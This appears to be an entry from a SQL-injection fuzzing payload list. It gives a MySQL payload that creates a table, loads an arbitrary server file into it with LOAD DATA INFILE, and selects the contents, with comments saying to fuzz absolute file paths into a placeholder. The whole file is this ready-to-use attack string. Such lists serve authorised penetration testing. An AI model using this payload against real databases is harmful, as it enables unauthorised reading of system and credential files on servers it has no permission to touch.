# mysql local file disclosure through sqli
# fuzz interesting absolute filepath/filename into <filepath>
create table myfile (input TEXT); load data infile '<filepath>' into table myfile; select * from myfile;
